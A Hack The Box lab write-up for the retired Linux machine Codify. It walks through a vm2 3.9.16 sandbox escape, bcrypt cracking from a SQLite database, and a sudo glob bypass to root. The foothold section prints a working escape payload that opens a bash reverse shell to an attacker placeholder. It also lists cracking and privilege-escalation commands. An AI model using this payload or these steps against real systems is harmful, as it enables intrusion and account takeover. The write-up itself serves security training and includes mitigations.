---
machine: Codify
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, vm2, sandbox-escape, privesc]
---

# Codify — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site offers a JavaScript playground with vm2 3.9.16, vulnerable to several sandbox-escape CVEs. Run code on the host and get `svc`; a SQLite database from the contact app leaks a bcrypt hash that cracks to `joshua`. `joshua` can run `mysql-backup.sh` with sudo; the `*` glob bypasses the check and `pspy` captures root's MySQL password, reused for `su`.

## Recon

```bash
nmap -Pn -sCV -p22,80,3000 <IP>
```

- `22` SSH, `80` nginx and `3000` the Node.js playground.
- The site shows an editor that runs JavaScript in a sandbox.
- `whatweb` and the page source identify vm2 3.9.16.

## Enumeration

- vm2 3.9.16 is vulnerable to CVE-2023-32314, CVE-2023-30547, CVE-2023-37466 and CVE-2023-37903.
- The sandbox does not isolate the process from the system; an `Error.prepareStackTrace` escape works.
- `/var/www/contact` holds a PHP application with SQLite.

## Foothold

Paste an escape PoC into the playground and run a reverse shell as `svc`.

```javascript
const { VM } = require("vm2");
new VM().run('err = new Error(); err.name = { toString: new Proxy(() => "", { apply(target, thiz, args) { const process = args.constructor.constructor("return process")(); throw process.mainModule.require("child_process").execSync("bash -c \\"bash -i >& /dev/tcp/<ATTACKER>/443 0>&1\\""); } }) }; err.stack;');
```

## Lateral movement

`contact.db` stores users and bcrypt hashes. Dump it, crack `joshua` and log in over SSH.

```bash
sqlite3 contact.db 'select username,password from users;'
hashcat -m 3200 joshua.hash rockyou.txt
ssh joshua@<IP>
```

## Privilege escalation

`joshua` can run `/opt/scripts/mysql-backup.sh` with sudo. The script compares the password with an unquoted glob; `*` matches anything and bypasses the check. `pspy` shows the `mysqldump` command with root's password, which also works for `su`.

```bash
sudo /opt/scripts/mysql-backup.sh
# enter *
./pspy64
su -
```

## Evidence

- vm2 3.9.16 and sandbox escape.
- Cracked bcrypt hash for `joshua`.
- `mysql-backup.sh` with the `*` glob.
- Captured root password and successful `su`.

## Lessons learned

- A JavaScript sandbox is not a boundary when its version has public CVEs.
- SQLite databases in internal apps often hold reused hashes.
- Comparing passwords with unquoted globs allows bypass and leaks arguments.

## Mitigation and detection

- Update vm2 or use `isolated-vm`; never run user code.
- Use bcrypt/Argon2 and unique passwords.
- Quote variables, use `read -r` and keep secrets off the command line.

## References

- [0xdf — Codify](https://0xdf.gitlab.io/2024/04/06/htb-codify.html)
- [IppSec — Codify](https://www.youtube.com/watch?v=wH1Lp-sEVv4)
- [Hack The Box — Codify](https://app.hackthebox.com/machines/codify)
